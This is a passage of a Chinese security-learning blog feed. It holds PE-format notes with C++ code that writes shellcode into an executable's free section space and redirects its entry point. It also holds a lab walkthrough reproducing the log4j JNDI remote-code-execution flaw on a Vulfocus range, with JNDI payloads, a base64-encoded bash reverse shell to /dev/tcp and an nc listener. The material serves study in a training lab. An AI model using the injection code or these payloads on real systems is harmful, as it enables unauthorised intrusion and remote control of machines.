class="hljs-literal">NULL</span>;<br>LPVOID pImageBuffer = <span class="hljs-literal">NULL</span>;<br>PBYTE codebegin = <span class="hljs-literal">NULL</span>;<br><br><br><br>pDosHeader = (PIMAGE_DOS_HEADER)imagebuffer;<br>pNtHeaders = <span class="hljs-built_in">FileToNtHeader</span>(imagebuffer);<br><br><span class="hljs-comment">//判断空闲区是否能存储shellcode代码(文件对齐大小-misc里真实内存大小）</span><br>pSectionHeaderBase = <span class="hljs-built_in">LocateSectionBase</span>(imagebuffer);<br><span class="hljs-keyword">if</span> (((pSectionHeaderBase-&gt;SizeOfRawData) - (pSectionHeaderBase-&gt;Misc.VirtualSize)) &lt; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(shellcode))<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;代码空闲区不足&quot;</span>);<br><span class="hljs-built_in">free</span>(imagebuffer);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">//把代码复制到空闲区</span><br>codebegin = (PBYTE)((DWORD)imagebuffer + pSectionHeaderBase-&gt;VirtualAddress + pSectionHeaderBase-&gt;Misc.VirtualSize)+<span class="hljs-number">14</span>;<br><span class="hljs-built_in">memcpy</span>(codebegin, shellcode, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(shellcode));<br><span class="hljs-comment">//修正E8</span><br><br>DWORD e8addr = (DWORD)(MESSAGE_BOX_ADDRESS - (pNtHeaders-&gt;OptionalHeader.ImageBase + ((DWORD)codebegin +(DWORD)<span class="hljs-number">0x0D</span> - (DWORD)imagebuffer)));<br><span class="hljs-comment">//e8addr = 0x7D8A55E1;</span><br>*(PDWORD)(codebegin + <span class="hljs-number">9</span>) = e8addr;<br><span class="hljs-comment">// 修正E9</span><br>DWORD e9addr = (DWORD)((pNtHeaders-&gt;OptionalHeader.ImageBase + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint) - (pNtHeaders-&gt;OptionalHeader.ImageBase + ((DWORD)codebegin + (DWORD)<span class="hljs-number">0x12</span> - (DWORD)imagebuffer)));<br><span class="hljs-comment">//e9addr = 0xFFFFDC95;</span><br>*(PDWORD)(codebegin + <span class="hljs-number">0xE</span>) = e9addr;<br><span class="hljs-comment">//pSectionHeaderBase = (PIMAGE_SECTION_HEADER)(BYTE*)imagebuffer + pDosHeader-&gt;e_lfanew + sizeof(IMAGE_); </span><br><br>pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint = (DWORD)codebegin - (DWORD)imagebuffer;<br><span class="hljs-comment">//pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint = 0x01A730;</span><br><span class="hljs-keyword">return</span> imagebuffer;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="新增加一个节"><a class="markdownIt-Anchor" href="#新增加一个节"></a> 新增加一个节</h1><h2 id="需要进行的操作"><a class="markdownIt-Anchor" href="#需要进行的操作"></a> 需要进行的操作</h2><p>1)添加一个新的节(可以copy一份)<br>2)在新增节后面填充一个节大小的000<br>3)修改PE头中节的数量<br>4)修改sizeofimage的大小<br>5)再原有数据的最后，新增一个节的数据(内存对齐的整数倍).<br>6)修正新增节表的属性</p><p>注意：SizeOfHeader - (DOS +垃圾数据+ PE标记+标准PE头+可选PE头+己存在节表)= 2个节表的大小</p><p>空间不够可以把PE头往上移动（占DOS头的垃圾数据）</p><h2 id="代码遇到的问题"><a class="markdownIt-Anchor" href="#代码遇到的问题"></a> 代码遇到的问题</h2><p>1.imagebuffer开辟内存空间太小了，解决：<strong>重新申请一个足够大的空间然后拷贝内存</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">LPVOID <span class="hljs-title">NEWSetion</span><span class="hljs-params">(LPVOID pImageBuffer)</span> </span>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">1)添加一个新的节(可以copy一份)</span><br><span class="hljs-comment">2)在新增节后面填充一个节大小的000</span><br><span class="hljs-comment">3)修改PE头中节的数量</span><br><span class="hljs-comment">4)修改sizeofimage的大小</span><br><span class="hljs-comment">5)再原有数据的最后，新增一个节的数据(内存对齐的整数倍).</span><br><span class="hljs-comment">6)修正新增节表的属性</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">注意：SizeOfHeader - (DOS +垃圾数据+ PE标记+标准PE头+可选PE头+己存在节表)= 2个节表的大小</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">空间不够可以把PE头往上移动（占DOS头的垃圾数据）</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br>PIMAGE_DOS_HEADER pDosHeader = <span class="hljs-literal">NULL</span>;<br>DWORD SizeOfImage = <span class="hljs-number">0</span>;<br>DWORD SizeOfHeaders = <span class="hljs-number">0</span>;<br>WORD NumberOfSections = <span class="hljs-number">0</span>;<br>DWORD pointtonew = <span class="hljs-number">0</span>;<br>PIMAGE_SECTION_HEADER pSectionHeaderBase = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER pnewSectionHeaderBase = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS pNtHeaders = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">//LPVOID pImageBuffer = NULL;</span><br>PBYTE codebegin = <span class="hljs-literal">NULL</span>;<br><br>pNtHeaders = <span class="hljs-built_in">FileToNtHeader</span>(pImageBuffer);<span class="hljs-comment">//nt头</span><br><span class="hljs-comment">//内存对齐大小</span><br><span class="hljs-keyword">const</span> DWORD size = pNtHeaders-&gt;OptionalHeader.SectionAlignment;<br><br>LPVOID npFileBuffer = <span class="hljs-built_in">malloc</span>(pNtHeaders-&gt;OptionalHeader.SizeOfImage + size);<br><br><br><span class="hljs-built_in">memset</span>(npFileBuffer,<span class="hljs-number">0x00</span> , pNtHeaders-&gt;OptionalHeader.SizeOfImage + size);<br><span class="hljs-built_in">memcpy</span>(npFileBuffer, pImageBuffer, pNtHeaders-&gt;OptionalHeader.SizeOfImage);<br><br>pImageBuffer = npFileBuffer;<br>pDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer;<span class="hljs-comment">//dos头</span><br>pNtHeaders = <span class="hljs-built_in">FileToNtHeader</span>(pImageBuffer);<span class="hljs-comment">//nt头</span><br><br><span class="hljs-comment">//验证剩余空间是否够2个节表大小</span><br>DWORD freesp = pNtHeaders-&gt;OptionalHeader.SizeOfHeaders - (pDosHeader-&gt;e_lfanew + <span class="hljs-number">0x4</span> + <span class="hljs-number">0x14</span> + pNtHeaders-&gt;FileHeader.SizeOfOptionalHeader + (pNtHeaders-&gt;FileHeader.NumberOfSections * <span class="hljs-number">0x28</span>));<br><span class="hljs-keyword">if</span> (freesp &lt; <span class="hljs-number">0x28</span> * <span class="hljs-number">2</span>)<br>&#123;<br><span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;空间不足够添加节表，添加失败&quot;</span>);<br><span class="hljs-keyword">return</span> pImageBuffer;<br>&#125;;<br><br><br><span class="hljs-comment">//找最后一个节表结束的位置添加节</span><br>pSectionHeaderBase = <span class="hljs-built_in">LocateSectionBase</span>(pImageBuffer);<br>LPVOID addsectionstart = (BYTE*)pSectionHeaderBase + (DWORD)(<span class="hljs-number">0x28</span> * (pNtHeaders-&gt;FileHeader.NumberOfSections));<br><span class="hljs-built_in">memcpy</span>(addsectionstart, pSectionHeaderBase, <span class="hljs-number">0x28</span>);<br><br><span class="hljs-comment">//在内存最后添加一个内存对齐整数倍的00</span><br>LPVOID endexe = (BYTE*)pImageBuffer + pNtHeaders-&gt;OptionalHeader.SizeOfImage ;<br><br><br>BYTE* tian1 = <span class="hljs-keyword">new</span> BYTE[size];<br><span class="hljs-built_in">memset</span>(tian1, <span class="hljs-number">0x00</span>,  size);<br><br><span class="hljs-comment">//tian1  </span><br><span class="hljs-comment">//BYTE tian[4096] = &#123; 0x00 &#125;;</span><br><span class="hljs-built_in">memcpy</span>(endexe, tian1 , size);<br><br><span class="hljs-comment">//修改sizeofimage大小</span><br>pNtHeaders-&gt;OptionalHeader.SizeOfImage = pNtHeaders-&gt;OptionalHeader.SizeOfImage + size;<br><br><span class="hljs-comment">//修改新添加节的属性</span><br>pnewSectionHeaderBase =(PIMAGE_SECTION_HEADER) addsectionstart;<br>pnewSectionHeaderBase-&gt;Misc.VirtualSize = size;<br>pnewSectionHeaderBase-&gt;VirtualAddress = (DWORD) endexe - (DWORD) pImageBuffer;<br>pnewSectionHeaderBase-&gt;SizeOfRawData = size;<br><span class="hljs-comment">//文件中偏移,先找上一个节的文件偏移+是一个节的大小（偷懒直接看是不是SizeOfRawData打过真实大小，直接加了）</span><br>PIMAGE_SECTION_HEADER presec = <span class="hljs-built_in">PIMAGE_SECTION_HEADER</span>((BYTE*)pnewSectionHeaderBase - <span class="hljs-number">0x28</span>);<br><span class="hljs-keyword">if</span> (presec-&gt;SizeOfRawData &gt; presec-&gt;Misc.VirtualSize)<br>&#123;<br>pointtonew = presec-&gt;SizeOfRawData + presec-&gt;PointerToRawData;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>pnewSectionHeaderBase-&gt;PointerToRawData = pointtonew;<br><br><br><br><span class="hljs-comment">//+pNtHeaders-&gt;OptionalHeader.SectionAlignment</span><br><span class="hljs-comment">//修改节的数量+1</span><br>pNtHeaders-&gt;FileHeader.NumberOfSections = pNtHeaders-&gt;FileHeader.NumberOfSections + <span class="hljs-number">1</span>;<br><br><br><br><span class="hljs-keyword">return</span> pImageBuffer;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="扩大节"><a class="markdownIt-Anchor" href="#扩大节"></a> 扩大节:</h1><p>1、拉伸到内存<br>2.分配一块新的空间: Size0fImage + Ex<br>3、将最后一个节的Si zeOfRawData和VirtualSize改成N<br>SizeOfRawData = VirtualSize = N<br>N = (SizeOfRawData或者VirtualSize 内存对齐后的值) + Ex （这两个值取最大的）<br>4、修改SizeOfImage大小<br>Size0fImage = Size0fImage + Ex</p><h1 id="合并节"><a class="markdownIt-Anchor" href="#合并节"></a> 合并节</h1><p>1、拉伸到内存<br>2、将第一个节的内存大小、文件大小改成一样<br>Max = SizeOfRawData&gt;VirtualSize?SizeOfRawData:VirtualSize<br>SizeOfRawData = VirtualSize = 最后一个节的VirtualAddress（23000h) + Max (4000h)- SizeOfHeaders内存对齐后的大小(1000h)<br>3、将第一个节的属性改为包含所有节的属性</p><p><strong>DWORD Characteristics;</strong>进行或运算即可<br>4、修改节的数量为1</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*</span><br><span class="hljs-comment">函数功能：合并节</span><br><span class="hljs-comment">参数：内存映像指针</span><br><span class="hljs-comment">返回值：内存映像指针</span><br><span class="hljs-comment">注意：无</span><br><span class="hljs-comment">1、拉伸到内存</span><br><span class="hljs-comment">2、将第一个节的内存大小、文件大小改成一样</span><br><span class="hljs-comment">   Max = SizeOfRawData&gt;VirtualSize?SizeOfRawData:VirtualSize</span><br><span class="hljs-comment">   SizeOfRawData = VirtualSize = 最后一个节的VirtualAddress + Max - SizeOfHeaders内存对齐后的大小</span><br><span class="hljs-comment">3、将第一个节的属性改为包含所有节的属性</span><br><span class="hljs-comment">4、修改节的数量为1</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function">LPVOID <span class="hljs-title">Setiontoone</span><span class="hljs-params">(LPVOID pImageBuffer)</span> </span>&#123;<br>PIMAGE_DOS_HEADER pDosHeader = <span class="hljs-literal">NULL</span>;<br>DWORD SizeOfImage = <span class="hljs-number">0</span>;<br>DWORD SizeOfHeaders = <span class="hljs-number">0</span>;<br>DWORD SizeOfRawData = <span class="hljs-number">0</span>;<br>DWORD VirtualSize = <span class="hljs-number">0</span>;<br>DWORD MAX = <span class="hljs-number">0</span>;<br>WORD NumberOfSections = <span class="hljs-number">0</span>;<br>DWORD pointtonew = <span class="hljs-number">0</span>;<br>PIMAGE_SECTION_HEADER pSectionHeaderBase = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER pnewSectionHeaderBase = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS pNtHeaders = <span class="hljs-literal">NULL</span>;<br><br>pDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer;<span class="hljs-comment">//dos头</span><br>pNtHeaders = <span class="hljs-built_in">FileToNtHeader</span>(pImageBuffer);<span class="hljs-comment">//nt头</span><br><br><span class="hljs-comment">//SizeOfHeaders内存对齐后的大小</span><br>pSectionHeaderBase = <span class="hljs-built_in">LocateSectionBase</span>(pImageBuffer);<br>DWORD SizeOfHeadersmem = pSectionHeaderBase-&gt;VirtualAddress;<br><span class="hljs-comment">//找最后一个节</span><br>PIMAGE_SECTION_HEADER pLaswSectionHeaderBase = <span class="hljs-built_in">PIMAGE_SECTION_HEADER</span> ((BYTE*)pSectionHeaderBase + (DWORD)(<span class="hljs-number">0x28</span> * (pNtHeaders-&gt;FileHeader.NumberOfSections<span class="hljs-number">-1</span>)));<br><span class="hljs-comment">//Max = SizeOfRawData&gt;VirtualSize?SizeOfRawData:VirtualSize</span><br><span class="hljs-keyword">if</span> (pLaswSectionHeaderBase-&gt;SizeOfRawData &gt; pLaswSectionHeaderBase-&gt;Misc.VirtualSize)<br>&#123;<br>MAX = pLaswSectionHeaderBase-&gt;SizeOfRawData;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>MAX = pLaswSectionHeaderBase-&gt;Misc.VirtualSize;<br>&#125;<br><span class="hljs-comment">//SizeOfRawData = VirtualSize = 最后一个节的VirtualAddress + Max - SizeOfHeaders内存对齐后的大小</span><br>SizeOfRawData = pLaswSectionHeaderBase-&gt;VirtualAddress + MAX - SizeOfHeadersmem;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">修改节表属性或操作</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> x = <span class="hljs-number">1</span>; x &lt; pNtHeaders-&gt;FileHeader.NumberOfSections ; x++) &#123;<br>PIMAGE_SECTION_HEADER pSectiontime = (PIMAGE_SECTION_HEADER)((BYTE*)pSectionHeaderBase +x* <span class="hljs-number">0x28</span>);<br>pSectionHeaderBase-&gt;Characteristics = pSectiontime-&gt;Characteristics | pSectionHeaderBase-&gt;Characteristics;<br>&#125;<br><span class="hljs-comment">//修改节表数量</span><br>pNtHeaders-&gt;FileHeader.NumberOfSections = <span class="hljs-number">1</span>;<br><br><span class="hljs-comment">//修改第一个节表属性</span><br>pSectionHeaderBase-&gt;SizeOfRawData = SizeOfRawData;<br>pSectionHeaderBase-&gt;Misc.VirtualSize = SizeOfRawData;<br><br><span class="hljs-comment">//修改所有节的属性</span><br><br><br><br><span class="hljs-keyword">return</span> pImageBuffer;<br></code></pre></td></tr></table></figure><p>​</p><h2 id="代码遇到的问题-2"><a class="markdownIt-Anchor" href="#代码遇到的问题-2"></a> 代码遇到的问题</h2><p>1.忘记修改节表属性了</p><h1 id="动态链接库-静态链接库"><a class="markdownIt-Anchor" href="#动态链接库-静态链接库"></a> 动态链接库 静态链接库</h1><p>静态链接库：直接把函数编译到exe里，但是如果需要修改函数就得重新编译exe</p><p>动态链接库：修改时直接编译dll即可，exe不用重新生成</p><h1 id="导出表"><a class="markdownIt-Anchor" href="#导出表"></a> 导出表</h1><p>在可选PE头里的数据目录第一项</p><img src="/2022/02/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0%E9%9A%8F%E8%AE%B0-1/image-20220307232838234.png" alt="image-20220307232838234" style="zoom: 50%;"><h2 id="数据目录结构"><a class="markdownIt-Anchor" href="#数据目录结构"></a> 数据目录结构</h2><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elm">// 数据目录 _IMAGE_DATA_DIRECTORY结构体<br>typedef struct _IMAGE_DATA_DIRECTORY &#123;<br>  <span class="hljs-type">DWORD</span> <span class="hljs-type">VirtualAddress</span>;     /**指向某个数据的相对虚拟地址   <span class="hljs-type">RAV</span>  偏移0x00**/<br>  <span class="hljs-type">DWORD</span> <span class="hljs-type">Size</span>;               /**某个数据块的大小                 偏移0x04**/<br>&#125; <span class="hljs-type">IMAGE_DATA_DIRECTORY</span>, *<span class="hljs-type">PIMAGE_DATA_DIRECTORY</span>;<br></code></pre></td></tr></table></figure><p>要在文件中找到需要RVA转FOA查看文件中的位置</p><h2 id="导出表结构"><a class="markdownIt-Anchor" href="#导出表结构"></a> 导出表结构</h2><img src="/2022/02/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0%E9%9A%8F%E8%AE%B0-1/image-20220308230652307.png" alt="image-20220308230652307" style="zoom:80%;"><p>*<strong>不一定是导出的函数地址长度最大，有可能几个函数指向同一个的地址</strong></p><p>numberoffunctions，不一定就是真正的导出函数个数（用序号的最后一个减去开始的序号然后加1）</p>]]></content>
    
    
    <categories>
      
      <category>逆向学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>log4j远程RCE漏洞复现笔记</title>
    <link href="/2021/12/13/log4j%E8%BF%9C%E7%A8%8BRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/"/>
    <url>/2021/12/13/log4j%E8%BF%9C%E7%A8%8BRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="log4j远程rce复现笔记"><a class="markdownIt-Anchor" href="#log4j远程rce复现笔记"></a> log4j远程rce复现笔记</h1><h2 id="0x00-vulfocus搭建"><a class="markdownIt-Anchor" href="#0x00-vulfocus搭建"></a> 0x00  Vulfocus搭建</h2><p>其实直接在docker拉取镜像即可，不过我觉得这个漏洞集成环境还是挺不错的，就顺手试试，环境Ubuntu20.10，参考官方文档<a href="https://github.com/fofapro/vulfocus/blob/master/INSTALL.md">vulfocus/INSTALL.md at master · fofapro/vulfocus (github.com)</a></p><p>1.先安装docker,使用国内daocloud 一键安装命令</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">curl -sSL http<span class="hljs-variable">s:</span>//<span class="hljs-built_in">get</span>.daocloud.io/docker | <span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure><p>2.拉取 Vulfocus 镜像：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">docker</span> pull vulfocus/vulfocus:latest<br></code></pre></td></tr></table></figure><p>3.运行 Vulfocus，email那几个参数应该是可以不要的</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo docker <span class="hljs-builtin-name">run</span> -d -p 80:80 -v /var/run/docker.sock:/var/run/docker.sock  -e <span class="hljs-attribute">VUL_IP</span>=192.168.111.130 -e <span class="hljs-attribute">EMAIL_HOST</span>=<span class="hljs-string">&quot;192.168.111.130 &quot;</span> -e <span class="hljs-attribute">EMAIL_HOST_USER</span>=<span class="hljs-string">&quot;admin@admin.com&quot;</span> -e <span class="hljs-attribute">EMAIL_HOST_PASSWORD</span>=<span class="hljs-string">&quot;12345678&quot;</span> vulfocus/vulfocus<br></code></pre></td></tr></table></figure><p>4.拉取漏洞镜像，镜像管理直接添加就行，可以通过名字添加，Vulfocus 的 docker 仓库 <a href="https://hub.docker.com/u/vulfocus">https://hub.docker.com/u/vulfocus</a></p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8BRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20211213153359282.png" alt="image-20211213153359282" style="zoom:80%;"><p>这里输入镜像名称vulfocus/log4j2-rce-2021-12-09即可添加log4j漏洞镜像</p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8BRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20211213153601659.png" alt="image-20211213153601659" style="zoom: 80%;"><p>之后启动靶场即可。</p><h2 id="0x01-漏洞验证"><a class="markdownIt-Anchor" href="#0x01-漏洞验证"></a> 0x01 漏洞验证</h2><p>这里使用知道创宇的平台进行验证，根据网上通用poc</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$&#123;</span><span class="hljs-symbol">jndi:</span><span class="hljs-symbol">ldap:</span>/<span class="hljs-regexp">/xxxxxx/</span>&#125;<br></code></pre></td></tr></table></figure><p>该靶场payload为：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/hello</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:55000<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded <br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>41<br><br>payload=$&#123;jndi:ldap://xxxxxx/exp&#125;<br></code></pre></td></tr></table></figure><p>验证：</p><p><strong>1.bp发送请求包</strong></p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8BRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20211213154147764.png" alt="image-20211213154147764" style="zoom:80%;"><p><strong>2.平台收到请求</strong></p><p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8BRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20211213154256762.png" alt="image-20211213154256762"></p><h2 id="0x02-远程rce验证"><a class="markdownIt-Anchor" href="#0x02-远程rce验证"></a> 0x02 远程RCE验证</h2><p>需要使用<a href="https://github.com/welk1n/JNDI-Injection-Exploit">welk1n/JNDI-Injection-Exploit: JNDI注入测试工具（A tool which generates JNDI links can start several servers to exploit JNDI Injection vulnerability,like Jackson,Fastjson,etc） (github.com)</a></p><p><strong>使用方法</strong></p><p>可执行程序为jar包，在命令行中运行以下命令：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ java -jar JNDI-Injection-Exploit-<span class="hljs-number">1.0</span>-SNAPSHOT-all<span class="hljs-selector-class">.jar</span> <span class="hljs-selector-attr">[-C]</span> <span class="hljs-selector-attr">[command]</span> <span class="hljs-selector-attr">[-A]</span> <span class="hljs-selector-attr">[address]</span><br></code></pre></td></tr></table></figure><p>其中:</p><ul><li><p><strong>-C</strong> - 远程class文件中要执行的命令。</p><p>（可选项 , 默认命令是mac下打开计算器，即&quot;open /Applications/Calculator.app&quot;）</p></li><li><p><strong>-A</strong> - 服务器地址，可以是IP地址或者域名。</p><p>（可选项 , 默认地址是第一个网卡地址）</p></li></ul><p><strong>这个靶场据说只能使用rmi协议，为了防止错误需要对命令进行base64编码，反弹shell命令如下</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/ip/端口 <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-attribute">base64</span>编码=&gt;YmFzaCAtaSA+JiAvZGV<span class="hljs-number">2</span>L<span class="hljs-number">3</span>RjcC<span class="hljs-number">9</span>pcC/v<span class="hljs-number">4</span>yAwPiYx<br></code></pre></td></tr></table></figure><p>vps上使用启动命令：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar JNDI-Injection-Exploit-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar -C <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC/v4yAwPiYx&#125;|&#123;base64,-d&#125;|bash&quot;</span> -A 你的ip<br></code></pre></td></tr></table></figure><p>效果如下</p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8BRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20211213164907314.png" alt="image-20211213164907314" style="zoom:80%;"><p>注意的是这个靶场只能使用Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):下的payload，所以payload为</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$&#123;</span><span class="hljs-symbol">jndi:</span><span class="hljs-symbol">rmi:</span>/<span class="hljs-regexp">/xxx.xxx.xxx.xxx/xxxx</span>&#125;<br></code></pre></td></tr></table></figure><p>bp发送请求包即可反弹shell</p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8BRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20211213165136457.png" alt="image-20211213165136457" style="zoom:80%;"><p>vps开启nc监听即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 端口<br></code></pre></td></tr></table></figure><p><img 